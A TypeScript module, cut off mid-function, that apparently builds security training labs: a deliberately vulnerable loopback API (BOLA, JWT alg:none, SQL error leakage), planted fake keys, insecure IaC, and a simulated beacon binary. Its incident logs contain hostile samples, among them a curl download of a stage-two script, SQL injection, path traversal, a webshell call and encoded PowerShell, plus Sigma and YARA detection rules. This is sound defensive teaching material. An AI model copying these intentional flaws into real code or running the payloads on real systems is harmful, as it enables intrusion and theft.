import { execFileSync } from "node:child_process"
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs"
import http from "node:http"
import type { AddressInfo } from "node:net"
import path from "node:path"
import {
  buildLabInvestigationKit,
  buildMemorySeed,
  labInvestigationKitExists,
  writeLabInvestigationKit,
} from "./investigation-kit.js"

export type TrainingLabCategory =
  | "web_api_security"
  | "graphql_oauth"
  | "secrets_supply_chain_iac"
  | "dfir_soc_sigma"
  | "reversing_crypto_mobile"

export interface TrainingLabChallenge {
  id: string
  title: string
  objective: string
  recommendedCapabilities: string[]
  remediationFile?: string
}

export interface TrainingLabDefinition {
  labId: string
  title: string
  category: TrainingLabCategory
  difficulty: "beginner" | "intermediate" | "advanced"
  hasLiveServer: boolean
  defaultPortHint: number | null
  summary: string
  challenges: TrainingLabChallenge[]
}

export interface TrainingLabStatus {
  labId: string
  title: string
  category: TrainingLabCategory
  difficulty: "beginner" | "intermediate" | "advanced"
  hasLiveServer: boolean
  provisioned: boolean
  running: boolean
  projectId: string
  workspaceRoot: string
  baseUrl?: string
  port?: number
  startedAt?: string
  requestCount: number
  recentRequests: Array<{ timestamp: string; method: string; url: string; statusCode: number }>
  summary: string
  challenges: TrainingLabChallenge[]
}

interface RunningLabServerState {
  server: http.Server
  port: number
  baseUrl: string
  startedAt: string
  requestCount: number
  recentRequests: Array<{ timestamp: string; method: string; url: string; statusCode: number }>
}

function buildTrainingPcapBuffer(): Uint8Array {
  const globalHdr = new Uint8Array(24)
  const gView = new DataView(globalHdr.buffer)
  gView.setUint32(0, 0xa1b2c3d4, true)
  gView.setUint16(4, 2, true)
  gView.setUint16(6, 4, true)
  gView.setUint32(16, 65535, true)
  gView.setUint32(20, 101, true) // LINKTYPE_RAW

  const dnsQuestion = Uint8Array.from([
    0xaa, 0xbb, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x07, 0x73, 0x74, 0x61, 0x67, 0x69, 0x6e, 0x67, // "staging"
    0x03, 0x6c, 0x61, 0x62, // "lab"
    0x05, 0x6c, 0x6f, 0x63, 0x61, 0x6c, // "local"
    0x00,
    0x00, 0x01, 0x00, 0x01,
  ])
  const udpLen = 8 + dnsQuestion.byteLength
  const ip1Len = 20 + udpLen
  const pkt1 = new Uint8Array(ip1Len)
  const p1v = new DataView(pkt1.buffer)
  pkt1[0] = 0x45
  p1v.setUint16(2, ip1Len, false)
  pkt1[8] = 64
  pkt1[9] = 17
  pkt1.set([10, 20, 0, 15], 12)
  pkt1.set([10, 20, 0, 53], 16)
  p1v.setUint16(20, 52100, false)
  p1v.setUint16(22, 53, false)
  p1v.setUint16(24, udpLen, false)
  pkt1.set(dnsQuestion, 28)

  const httpPayload = new TextEncoder().encode(
    "POST /api/v1/login HTTP/1.1\r\nHost: staging.lab.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"ops_admin\",\"flag\":\"LAB{PCAP_CLEARTEXT_HTTP_CAPTURE}\"}\r\n",
  )
  const ip2Len = 20 + 20 + httpPayload.byteLength
  const pkt2 = new Uint8Array(ip2Len)
  const p2v = new DataView(pkt2.buffer)
  pkt2[0] = 0x45
  p2v.setUint16(2, ip2Len, false)
  pkt2[8] = 64
  pkt2[9] = 6
  pkt2.set([10, 20, 0, 15], 12)
  pkt2.set([10, 20, 0, 80], 16)
  p2v.setUint16(20, 49222, false)
  p2v.setUint16(22, 8080, false)
  pkt2[32] = 0x50
  pkt2.set(httpPayload, 40)

  const wrapRecord = (pkt: Uint8Array, tsSec: number) => {
    const rec = new Uint8Array(16 + pkt.byteLength)
    const rv = new DataView(rec.buffer)
    rv.setUint32(0, tsSec, true)
    rv.setUint32(8, pkt.byteLength, true)
    rv.setUint32(12, pkt.byteLength, true)
    rec.set(pkt, 16)
    return rec
  }

  const r1 = wrapRecord(pkt1, 1730000100)
  const r2 = wrapRecord(pkt2, 1730000105)
  const out = new Uint8Array(globalHdr.byteLength + r1.byteLength + r2.byteLength)
  out.set(globalHdr, 0)
  out.set(r1, globalHdr.byteLength)
  out.set(r2, globalHdr.byteLength + r1.byteLength)
  return out
}

function buildTrainingElf64Buffer(): Uint8Array {
  const buf = new Uint8Array(512)
  // ELF64 header (x86_64, ET_DYN, entry 0x401000, 1 PT_LOAD program header so binary-disasm decodes instructions)
  buf.set([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0], 0)
  const view = new DataView(buf.buffer)
  view.setUint16(16, 3, true) // ET_DYN
  view.setUint16(18, 62, true) // EM_X86_64
  view.setUint32(20, 1, true)
  view.setBigUint64(24, 0x401000n, true) // e_entry
  view.setBigUint64(32, 64n, true) // e_phoff
  view.setUint16(52, 64, true) // e_ehsize
  view.setUint16(54, 56, true) // e_phentsize
  view.setUint16(56, 1, true) // e_phnum

  // Program header PT_LOAD mapping file offset 0x80 -> vaddr 0x401000 (PF_R | PF_X = 5)
  view.setUint32(64, 1, true) // PT_LOAD
  view.setUint32(68, 5, true) // PF_R | PF_X
  view.setBigUint64(72, 0x80n, true) // p_offset
  view.setBigUint64(80, 0x401000n, true) // p_vaddr
  view.setBigUint64(88, 0x401000n, true) // p_paddr
  view.setBigUint64(96, 128n, true) // p_filesz
  view.setBigUint64(104, 128n, true) // p_memsz
  view.setBigUint64(112, 0x1000n, true)

  // Real x86_64 prologue + syscall instructions at offset 0x80 (128)
  buf.set(
    [
      0x55, // push rbp
      0x48, 0x89, 0xe5, // mov rbp, rsp
      0x48, 0x83, 0xec, 0x20, // sub rsp, 0x20
      0x48, 0x31, 0xc0, // xor rax, rax
      0x0f, 0x05, // syscall
      0x48, 0x89, 0xec, // mov rsp, rbp
      0x5d, // pop rbp
      0xc3, // ret
    ],
    0x80,
  )

  // Embedded strings + single-byte XOR (key 0x42) obfuscated flag at offset 200
  const indicators = new TextEncoder().encode(
    "http://127.0.0.1:9443/c2/checkin\0VirtualAlloc\0CreateRemoteThread\0/bin/sh\0CYBERLAB_TRAIN_BEACON_V1\0",
  )
  buf.set(indicators, 192)

  const secretPlain = new TextEncoder().encode("LAB{XOR_KEY_0x42_DECODED_BEACON_CONFIG}")
  const xored = secretPlain.map((b) => b ^ 0x42)
  buf.set(xored, 340)

  return buf
}

function buildMinimalZip(files: Array<{ name: string; content: string }>): Uint8Array {
  const localParts: Uint8Array[] = []
  const centralParts: Uint8Array[] = []
  let localOffset = 0

  for (const f of files) {
    const nameBytes = new TextEncoder().encode(f.name)
    const dataBytes = new TextEncoder().encode(f.content)

    const lfh = new Uint8Array(30 + nameBytes.byteLength + dataBytes.byteLength)
    const lv = new DataView(lfh.buffer)
    lv.setUint32(0, 0x04034b50, true)
    lv.setUint16(4, 20, true)
    lv.setUint32(18, dataBytes.byteLength, true)
    lv.setUint32(22, dataBytes.byteLength, true)
    lv.setUint16(26, nameBytes.byteLength, true)
    lfh.set(nameBytes, 30)
    lfh.set(dataBytes, 30 + nameBytes.byteLength)
    localParts.push(lfh)

    const cdh = new Uint8Array(46 + nameBytes.byteLength)
    const cv = new DataView(cdh.buffer)
    cv.setUint32(0, 0x02014b50, true)
    cv.setUint16(4, 20, true)
    cv.setUint16(6, 20, true)
    cv.setUint32(20, dataBytes.byteLength, true)
    cv.setUint32(24, dataBytes.byteLength, true)
    cv.setUint16(28, nameBytes.byteLength, true)
    cv.setUint32(42, localOffset, true)
    cdh.set(nameBytes, 46)
    centralParts.push(cdh)

    localOffset += lfh.byteLength
  }

  const cdSize = centralParts.reduce((acc, b) => acc + b.byteLength, 0)
  const eocd = new Uint8Array(22)
  const ev = new DataView(eocd.buffer)
  ev.setUint32(0, 0x06054b50, true)
  ev.setUint16(8, files.length, true)
  ev.setUint16(10, files.length, true)
  ev.setUint32(12, cdSize, true)
  ev.setUint32(16, localOffset, true)

  const full = new Uint8Array(localOffset + cdSize + eocd.byteLength)
  let pos = 0
  for (const p of [...localParts, ...centralParts, eocd]) {
    full.set(p, pos)
    pos += p.byteLength
  }
  return full
}

export const BUILTIN_TRAINING_LABS: readonly TrainingLabDefinition[] = [
  {
    labId: "lab-owasp-api-bola",
    title: "OWASP API Security Lab (BOLA/IDOR, JWT alg:none & Error Leakage)",
    category: "web_api_security",
    difficulty: "intermediate",
    hasLiveServer: true,
    defaultPortHint: 19081,
    summary:
      "Servidor REST API real em loopback com vulnerabilidades intencionais de BOLA/IDOR (/api/v1/accounts/:id), aceitação de JWT alg:none (/api/v1/admin/debug), vazamento de erro SQL (/api/v1/search?q=') e ausência de headers de segurança. Editável ao vivo via server-config.json!",
    challenges: [
      {
        id: "bola-1002",
        title: "Detectar e corrigir BOLA/IDOR entre User A (1001) e User B (1002)",
        objective: "Testar acesso cruzado em /api/v1/accounts/1002 com o token do User A e endurecer enforceAccountOwnership em server-config.json.",
        recommendedCapabilities: ["web-assessment.api-graphql-oauth-lab", "web-assessment.http-repeater"],
        remediationFile: "server-config.json",
      },
      {
        id: "jwt-alg-none",
        title: "Auditar bypass de assinatura JWT (alg:none) em /api/v1/admin/debug",
        objective: "Inspecionar o token JWT, validar o bypass alg:none e ativar rejectAlgNoneJwt em server-config.json.",
        recommendedCapabilities: ["web-assessment.decoder-sequencer", "web-assessment.http-repeater"],
        remediationFile: "server-config.json",
      },
      {
        id: "sql-error-headers",
        title: "Eliminar vazamento de erro SQL e aplicar headers CSP/HSTS/Frame",
        objective: "Auditar /api/v1/search?q=' com o Param Auditor e ativar sanitizeSqlQuery + enableSecurityHeaders.",
        recommendedCapabilities: ["web-assessment.param-audit", "web-assessment.http-security-inspector"],
        remediationFile: "server-config.json",
      },
    ],
  },
  {
    labId: "lab-graphql-oauth-sso",
    title: "GraphQL Introspection/Batching & OAuth2/OIDC PKCE Lab",
    category: "graphql_oauth",
    difficulty: "intermediate",
    hasLiveServer: true,
    defaultPortHint: 19082,
    summary:
      "Servidor GraphQL (/graphql) e Provedor OAuth2/OIDC (/.well-known/openid-configuration, /oauth/authorize) com introspecção aberta, query batching sem limite, ausência de exigência PKCE e redirect_uri aberto. Corrigível ao vivo em lab-policy.json!",
    challenges: [
      {
        id: "gql-introspection-batch",
        title: "Explorar introspecção e batching GraphQL e aplicar controles",
        objective: "Validar exposição do schema interno e queries em lote em /graphql e endurecer lab-policy.json.",
        recommendedCapabilities: ["web-assessment.api-graphql-oauth-lab", "web-assessment.http-repeater"],
        remediationFile: "lab-policy.json",
      },
      {
        id: "oauth-pkce-redirect",
        title: "Corrigir OAuth2 sem PKCE e Open Redirect em /oauth/authorize",
        objective: "Auditar /.well-known/openid-configuration e /oauth/authorize e ativar requirePkceS256 + strictRedirectUri.",
        recommendedCapabilities: ["web-assessment.api-graphql-oauth-lab"],
        remediationFile: "lab-policy.json",
      },
    ],
  },
  {
    labId: "lab-keyhunter-supply-chain",
    title: "Key Hunter, JS Bundle Secrets, SBOM & Cloud IaC Lab",
    category: "secrets_supply_chain_iac",
    difficulty: "beginner",
    hasLiveServer: true,
    defaultPortHint: 19083,
    summary:
      "Aplicação Web + repositório completo contendo chaves sintéticas de treino vazadas em JS bundle minificado (/static/app.bundle.js), credenciais hardcoded em src/config.ts, dependências vulneráveis e manifestos inseguros (Dockerfile privilegiado, Kubernetes e Terraform 0.0.0.0/0).",
    challenges: [
      {
        id: "hunt-bundle-and-repo-keys",
        title: "Caçar chaves vazadas no código e no bundle JS servido ao vivo",
        objective: "Executar code-analysis.key-hunter no workspace e contra a URL do lab, removendo os segredos expostos.",
        recommendedCapabilities: ["code-analysis.key-hunter", "code-analysis.workspace-audit"],
        remediationFile: "src/config.ts",
      },
      {
        id: "harden-iac-and-sbom",
        title: "Gerar SBOM CycloneDX 1.5 e corrigir falhas IaC (Dockerfile, K8s e Terraform)",
        objective: "Auditar o workspace com code-analysis.sca-sbom-iac-audit e corrigir container privilegiado e SG 0.0.0.0/0.",
        recommendedCapabilities: ["code-analysis.sca-sbom-iac-audit"],
        remediationFile: "infra/main.tf",
      },
    ],
  },
  {
    labId: "lab-dfir-soc-incident",
    title: "Blue Team DFIR, Sigma Rules & Multi-Stage Incident Lab",
    category: "dfir_soc_sigma",
    difficulty: "intermediate",
    hasLiveServer: false,
    defaultPortHint: null,
    summary:
      "Cenário completo de resposta a incidentes contendo logs correlacionados de invasão em 3 estágios: força bruta SSH seguida de sudo em logs/auth.log, webshell/SQLi em logs/nginx-access.log e execução PowerShell codificada em logs/windows-events.ndjson.",
    challenges: [
      {
        id: "sigma-timeline",
        title: "Reconstruir a timeline do incidente com regras Sigma e criar regra customizada",
        objective: "Executar forensics.dfir-sigma-triage sobre logs/, escrever regra Sigma própria em rules/custom-detection.yml e registar relatório/finding.",
        recommendedCapabilities: ["forensics.dfir-sigma-triage"],
        remediationFile: "rules/custom-detection.yml",
      },
    ],
  },
  {
    labId: "lab-reversing-crypto-mobile",
    title: "Reverse Engineering, ELF64 Disassembly, XOR/Entropy & Mobile APK Lab",
    category: "reversing_crypto_mobile",
    difficulty: "advanced",
    hasLiveServer: false,
    defaultPortHint: null,
    summary:
      "Laboratório offline seguro com binário ELF64 x86_64 real (samples/beacon-sim.elf com instruções nativas e payload ofuscado com XOR 0x42), captura de rede .pcap (captures/lab-traffic.pcap) e pacote Android .apk (mobile/corp-companion.apk).",
    challenges: [
      {
        id: "elf-disasm-xor-yara",
        title: "Desmontar samples/beacon-sim.elf, decodificar config XOR 0x42 e criar regra YARA",
        objective: "Inspecionar o ELF64 com binary-triage e binary-disasm, decodificar o payload com entropy-recipe-studio e validar regra YARA em rules/beacon.yar.",
        recommendedCapabilities: [
          "reverse-engineering.binary-triage",
          "reverse-engineering.binary-disasm",
          "reverse-engineering.entropy-recipe-studio",
          "forensics.yara-scan",
        ],
        remediationFile: "rules/beacon.yar",
      },
      {
        id: "pcap-and-apk-triage",
        title: "Extrair credenciais em texto claro do .pcap e auditar permissões/IoCs do .apk",
        objective: "Analisar captures/lab-traffic.pcap e mobile/corp-companion.apk e consolidar evidências SHA-256.",
        recommendedCapabilities: ["network-assessment.pcap-analyzer", "mobile-forensics.artifact-triage"],
      },
    ],
  },
]

function tryGitInit(dir: string): void {
  if (existsSync(path.join(dir, ".git"))) return
  try {
    execFileSync("git", ["init", "-q"], { cwd: dir, stdio: "ignore" })
  } catch {
    // Safe fallback if git binary is absent
  }
}

export class TrainingLabManager {
  private readonly runningServers = new Map<string, RunningLabServerState>()

  constructor(private readonly labsRootDir: string) {}

  getLabWorkspacePath(labId: string): string {
    return path.resolve(this.labsRootDir, labId)
  }

  getLabProjectId(labId: string): string {
    return `lab-${labId.replace(/^lab-/, "")}`
  }

  listLabs(): TrainingLabStatus[] {
    return BUILTIN_TRAINING_LABS.map((def) => this.getLabStatus(def.labId))
  }

  getLabStatus(labId: string): TrainingLabStatus {
    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === labId)
    if (!def) {
      throw new Error(`Unknown training lab "${labId}". Available: ${BUILTIN_TRAINING_LABS.map((l) => l.labId).join(", ")}`)
    }
    const wsRoot = this.getLabWorkspacePath(def.labId)
    const provisioned = existsSync(path.join(wsRoot, "LAB_BRIEFING.md"))
    const srv = this.runningServers.get(def.labId)
    return {
      labId: def.labId,
      title: def.title,
      category: def.category,
      difficulty: def.difficulty,
      hasLiveServer: def.hasLiveServer,
      provisioned,
      running: Boolean(srv),
      projectId: this.getLabProjectId(def.labId),
      workspaceRoot: wsRoot,
      ...(srv?.baseUrl ? { baseUrl: srv.baseUrl } : {}),
      ...(srv?.port !== undefined ? { port: srv.port } : {}),
      ...(srv?.startedAt ? { startedAt: srv.startedAt } : {}),
      requestCount: srv?.requestCount ?? 0,
      recentRequests: srv ? [...srv.recentRequests] : [],
      summary: def.summary,
      challenges: def.challenges,
    }
  }

  private writeLabFiles(labId: string, wsRoot: string): void {
    mkdirSync(wsRoot, { recursive: true })

    if (labId === "lab-owasp-api-bola") {
      mkdirSync(path.join(wsRoot, "src"), { recursive: true })
      writeFileSync(
        path.join(wsRoot, "server-config.json"),
        JSON.stringify(
          {
            enforceAccountOwnership: false,
            rejectAlgNoneJwt: false,
            sanitizeSqlQuery: false,
            enableSecurityHeaders: false,
          },
          null,
          2,
        ),
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "src", "api-handler.ts"),
        `// Editable Reference Handler for OWASP API Security Training Lab
// Toggle controls in ../server-config.json (or refactor logic here) and re-run CyberLab OS scanners!
export interface LabSecurityControls {
  enforceAccountOwnership: boolean
  rejectAlgNoneJwt: boolean
  sanitizeSqlQuery: boolean
  enableSecurityHeaders: boolean
}
`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "openapi.json"),
        JSON.stringify(
          {
            openapi: "3.0.3",
            info: { title: "CyberLab Training Banking API", version: "1.0.0" },
            paths: {
              "/api/v1/accounts/1001": { get: { summary: "Account 1001 (User A)" } },
              "/api/v1/accounts/1002": { get: { summary: "Account 1002 (User B - BOLA Test)" } },
              "/api/v1/admin/debug": { get: { summary: "Admin Diagnostics (JWT Check)" } },
              "/api/v1/search": { get: { summary: "Transaction Search (?q=)" } },
            },
          },
          null,
          2,
        ),
        "utf8",
      )
    } else if (labId === "lab-graphql-oauth-sso") {
      writeFileSync(
        path.join(wsRoot, "lab-policy.json"),
        JSON.stringify(
          {
            allowIntrospection: true,
            allowBatchQueries: true,
            maxQueryDepth: 25,
            requirePkceS256: false,
            strictRedirectUriAllowlist: false,
            allowedRedirectOrigins: ["http://127.0.0.1:4096"],
          },
          null,
          2,
        ),
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "schema.graphql"),
        `type Query {
  me: User
  internalSecrets: [String!]!
  users(limit: Int): [User!]!
}

type User {
  id: ID!
  email: String!
  role: String!
  manager: User
}
`,
        "utf8",
      )
    } else if (labId === "lab-keyhunter-supply-chain") {
      mkdirSync(path.join(wsRoot, "src"), { recursive: true })
      mkdirSync(path.join(wsRoot, "public", "static"), { recursive: true })
      mkdirSync(path.join(wsRoot, "infra"), { recursive: true })

      // Construct synthetic training tokens dynamically so static scanners on CyberLab's own repo aren't noisy, while live lab workspace has realistic patterns
      const fakeOpenAi = `sk-proj-${"Tr41n1ngL4bK3yHunt3r9876543210AbCdEfGhIjKlMnOpQrStUvWxYz"}`
      const fakeAwsId = `AKIA${"TRAINLAB99887766"}`
      const fakeGitHub = `ghp_${"99887766554433221100AaBbCcDdEeFfGgHh"}`

      writeFileSync(
        path.join(wsRoot, "src", "config.ts"),
        `// Intentional Training Lab file — remediate hardcoded secrets by moving to environment variables!
export const TRAINING_APP_CONFIG = {
  llmApiKey: "${fakeOpenAi}",
  awsAccessKeyId: "${fakeAwsId}",
  vcsToken: "${fakeGitHub}",
  verifyTlsCertificates: false,
}
`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "public", "static", "app.bundle.js"),
        `/* Minified Frontend Bundle (Training Lab) */window.__APP_BOOT__={env:"staging",openaiKey:"${fakeOpenAi}",awsKey:"${fakeAwsId}"};console.log("loaded");\n`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "package.json"),
        JSON.stringify(
          {
            name: "cyberlab-supply-chain-lab",
            version: "0.1.0",
            dependencies: {
              lodash: "4.17.15",
              express: "4.17.1",
              jsonwebtoken: "8.5.1",
            },
          },
          null,
          2,
        ),
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "Dockerfile"),
        `FROM node:latest
USER root
WORKDIR /app
COPY . .
EXPOSE 8080
CMD ["node", "server.js"]
`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "infra", "k8s-deployment.yaml"),
        `apiVersion: apps/v1
kind: Deployment
metadata:
  name: training-api
spec:
  template:
    spec:
      hostNetwork: true
      containers:
        - name: api
          image: training/api:latest
          securityContext:
            privileged: true
`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "infra", "main.tf"),
        `resource "aws_security_group" "lab_ssh" {
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}

resource "aws_s3_bucket" "lab_exports" {
  bucket = "cyberlab-training-public-bucket"
  acl    = "public-read"
}
`,
        "utf8",
      )
    } else if (labId === "lab-dfir-soc-incident") {
      mkdirSync(path.join(wsRoot, "logs"), { recursive: true })
      mkdirSync(path.join(wsRoot, "rules"), { recursive: true })
      mkdirSync(path.join(wsRoot, "playbooks"), { recursive: true })

      writeFileSync(
        path.join(wsRoot, "logs", "auth.log"),
        [
          "Oct 29 02:11:04 prod-bastion sshd[4101]: Failed password for invalid user admin from 198.51.100.77 port 50112 ssh2",
          "Oct 29 02:11:06 prod-bastion sshd[4102]: Failed password for invalid user admin from 198.51.100.77 port 50114 ssh2",
          "Oct 29 02:11:08 prod-bastion sshd[4103]: Failed password for deploy from 198.51.100.77 port 50118 ssh2",
          "Oct 29 02:11:11 prod-bastion sshd[4104]: Accepted password for deploy from 198.51.100.77 port 50122 ssh2",
          "Oct 29 02:12:45 prod-bastion sudo:   deploy : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c curl http://198.51.100.77/stage2.sh",
        ].join("\n") + "\n",
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "logs", "nginx-access.log"),
        [
          '198.51.100.77 - - [29/Oct/2026:02:09:10 +0000] "GET /products?id=1%20UNION%20SELECT%20username,password%20FROM%20users HTTP/1.1" 200 4120 "-" "sqlmap/1.8"',
          '198.51.100.77 - - [29/Oct/2026:02:10:02 +0000] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 1890 "-" "curl/8.5.0"',
          '198.51.100.77 - - [29/Oct/2026:02:10:40 +0000] "POST /uploads/cmd.php?cmd=whoami HTTP/1.1" 200 64 "-" "Mozilla/5.0"',
        ].join("\n") + "\n",
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "logs", "windows-events.ndjson"),
        [
          JSON.stringify({
            timestamp: "2026-10-29T02:14:10Z",
            EventID: 4624,
            LogonType: 9,
            TargetUserName: "svc_backup",
            IpAddress: "198.51.100.77",
            AuthPackage: "NTLM",
          }),
          JSON.stringify({
            timestamp: "2026-10-29T02:15:02Z",
            EventID: 4688,
            CommandLine: "powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            ParentImage: "C:\\Windows\\System32\\cmd.exe",
          }),
        ].join("\n") + "\n",
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "rules", "custom-detection.yml"),
        `title: Staging Host 198.51.100.77 Post-Exploitation Download
id: lab-sigma-stage2-001
level: critical
detection:
  selection:
    message|contains:
      - "198.51.100.77"
      - "stage2.sh"
  condition: selection
`,
        "utf8",
      )
      writeFileSync(
        path.join(wsRoot, "playbooks", "containment.md"),
        "# Incident Containment Notes\n\nUse this workspace to write containment scripts, custom Sigma rules, and forensic timeline summaries.\n",
        "utf8",
      )
    } else if (labId === "lab-reversing-crypto-mobile") {
      mkdirSync(path.join(wsRoot, "samples"), { recursive: true })
      mkdirSync(path.join(wsRoot, "captures"), { recursive: true })
      mkdirSync(path.join(wsRoot, "mobile"), { recursive: true })
      mkdirSync(path.join(wsRoot, "rules"), { recursive: true })

      writeFileSync(path.join(wsRoot, "samples", "beacon-sim.elf"), buildTrainingElf64Buffer())
      writeFileSync(path.join(wsRoot, "captures", "lab-traffic.pcap"), buildTrainingPcapBuffer())
      writeFileSync(
        path.join(wsRoot, "mobile", "corp-companion.apk"),
        buildMinimalZip([
          {
            name: "AndroidManifest.xml",
            content:
              "manifest package=com.cyberlab.training android.permission.READ_SMS android.permission.RECORD_AUDIO android.permission.BIND_ACCESSIBILITY_SERVICE http://telemetry-insecure.lab.local/collect",
          },
          {
            name: "classes.dex",
            content: "dex\n035\0Lcom/cyberlab/training/TelemetrySync;\0http://telemetry-insecure.lab.local/collect\0",
          },
          {
            name: "lib/x86_64/libcrypto_stub.so",
            content: "\x7fELF_TRAINING_STUB",
          },
        ]),
      )
      writeFileSync(
        path.join(wsRoot, "rules", "beacon.yar"),
        `rule CyberLab_Training_Beacon_Sim {
  strings:
    $elf_tag = "CYBERLAB_TRAIN_BEACON_V1" ascii
    $c2 = "http://127.0.0.1:9443/c2/checkin" ascii
  condition:
    $elf_tag and $c2
}
`,
        "utf8",
      )
    }

    const def = BUILTIN_TRAINING_LABS.find((l) => l.labId === labId)!
    writeFileSync(
      path.join(wsRoot, "LAB_BRIEFING.md"),
      [
        `# ${def.title}`,
        "",
        `- **Lab ID**: \`${def.labId}\``,
        `- **Categoria**: \`${def.category}\``,
        `- **Dificuldade**: \`${def.difficulty}\``,
        "",
        `## Resumo`,
        def.summary,
        "",
        `## Desafios & Objetivos`,
        ...def.challenges.map(
          (c, idx) =>
            `${idx + 1}. **${c.title}** (\`${c.id}\`)\n   - Objetivo: ${c.objective}\n   - Capabilities sugeridas: ${c.recommendedCapabilities.map((x) => `\`${x}\``).join(", ")}${c.remediationFile ? `\n   - Ficheiro de remediação/regra: \`${c.remediationFile}\`` : ""}`,
        ),
        "",
      ].join("\n"),
      "utf8",
    )

    tryGitInit(wsRoot)
    const dotGitDir = path.join(wsRoot, ".git")
    if (existsSync(dotGitDir)) {
      writeFileSync(path.join(dotGitDir, "opencode"), `${this.getLabProjectId(labId)}\n`, "utf8")
    }
  }

  private createHttpHandlerForLab(labId: string, wsRoot: string, stateRef: { record: (method: string, url: string, status: number) => void }): http.RequestListener {
    return (req, res) => {
      const method = req.method || "GET"
      const rawUrl = req.url || "/"
      const u = new URL(rawUrl, "http://127.0.0.1")

      const send = (status: number, body: unknown, extraHeaders: Record<string, string> = {}) => {
        stateRef.record(method, rawUrl, status)
        const payload = typeof body === "string" ? body : JSON.stringify(body, null, 2)
        const contentType = typeof body === "string" ? extraHeaders["Content-Type"] || "text/html; charset=utf-8" : "application/json; charset=utf-8"
        res.writeHead(status, {
          "Content-Type": contentType,
          ...extraHeaders,
        })
        res.end(payload)
      }

      if (labId === "lab-owasp-api-bola") {
        let cfg = {
          enforceAccountOwnership: false,
          rejectAlgNoneJwt: false,
          sanitizeSqlQuery: false,
          enableSecurityHeaders: false,
        }
        try {
          cfg = { ...cfg, ...JSON.parse(readFileSync(path.join(wsRoot, "server-config.json"), "utf8")) }
        } catch {
          // Use defaults if malformed while editing
        }

        const secHeaders: Record<string, string> = cfg.enableSecurityHeaders
          ? {
              "Content-Security-Policy": "default-src 'none'; frame-ancestors 'none'",
              "Strict-Transport-Security": "max-age=63072000; includeSubDomains; preload",
              "X-Content-Type-Options": "nosniff",
              "X-Frame-Options": "DENY",
            }
          : {}

        if (u.pathname === "/" || u.pathname === "/health") {
          const sampleAlgNone = `${Buffer.from('{"alg":"none","typ":"JWT"}').toString("base64url")}.${Buffer.from('{"sub":"user-1001","role":"admin"}').toString("base64url")}.`
          return send(
            200,
            {
              labId,
              status: "online",
              controls: cfg,
              endpoints: ["/openapi.json", "/api/v1/accounts/1001", "/api/v1/accounts/1002", "/api/v1/admin/debug", "/api/v1/search?q=test"],
              sampleUserAToken: "Bearer token-user-a-1001",
              sampleUserBToken: "Bearer token-user-b-1002",
              sampleForgedAlgNoneJwt: sampleAlgNone,
            },
            secHeaders,
          )
        }

        if (u.pathname === "/openapi.json") {
          const spec = readFileSync(path.join(wsRoot, "openapi.json"), "utf8")
          return send(200, spec, { ...secHeaders, "Content-Type": "application/json; charset=utf-8" })
        }

        if (u.pathname.startsWith("/api/v1/accounts/")) {
          const accountId = u.pathname.split("/").pop() || ""
          const auth = String(req.headers.authorization || "")
          const callerAccount = auth.includes("user-b") ? "1002" : auth.includes("user-a") ? "1001" : ""
          if (!callerAccount && cfg.enforceAccountOwnership) {
            return send(401, { error: "Authentication required" }, secHeaders)
          }
          if (cfg.enforceAccountOwnership && callerAccount !== accountId) {
            return send(403, { error: "Forbidden: BOLA ownership check blocked cross-account access" }, secHeaders)
          }
          return send(
            200,
            {
              accountId,
              owner: accountId === "1002" ? "bob@corp.lab" : "alice@corp.lab",
              balanceUsd: accountId === "1002" ? 94500.0 : 1250.0,
              bolaFlag: accountId === "1002" && callerAccount !== "1002" ? "LAB{BOLA_CROSS_ACCOUNT_EXPOSED}" : undefined,
            },
            secHeaders,
          )
        }

        if (u.pathname === "/api/v1/admin/debug") {
          const auth = String(req.headers.authorization || "").replace(/^Bearer\s+/i, "").trim()
          const parts = auth.split(".")
          if (parts.length >= 2) {
            try {
              const hdr = JSON.parse(Buffer.from(parts[0]!, "base64url").toString("utf8")) as { alg?: string }
              const body = JSON.parse(Buffer.from(parts[1]!, "base64url").toString("utf8")) as { role?: string }
              if (String(hdr.alg).toLowerCase() === "none" && !cfg.rejectAlgNoneJwt && body.role === "admin") {
                return send(200, { adminAccess: true, flag: "LAB{JWT_ALG_NONE_ACCEPTED}" }, secHeaders)
              }
            } catch {
              // Invalid token
            }
          }
          return send(401, { error: "Valid signed admin JWT required" }, secHeaders)
        }

        if (u.pathname === "/api/v1/search") {
          const q = u.searchParams.get("q") || ""
          if (!cfg.sanitizeSqlQuery && (q.includes("'") || q.includes("\"") || q.toUpperCase().includes("UNION"))) {
            return send(
              500,
              `SQLITE_ERROR: near "${q}": syntax error in SELECT id, amount FROM ledger WHERE memo LIKE '%${q}%'`,
              { ...secHeaders, "Content-Type": "text/plain; charset=utf-8" },
            )
          }
          return send(200, { query: q, results: [{ id: "tx-01", memo: "Lab transfer", amount: 42 }] }, secHeaders)
        }

        return send(404, { error: "Route not found" }, secHeaders)
      }

      if (labId === "lab-graphql-oauth-sso") {
        let policy = {
          allowIntrospection: true,
          allowBatchQueries: true,
          maxQueryDepth: 25,
          requirePkceS256: false,
          strictRedirectUriAllowlist: false,
          allowedRedirectOrigins: ["http://127.0.0.1:4096"],
        }
        try {
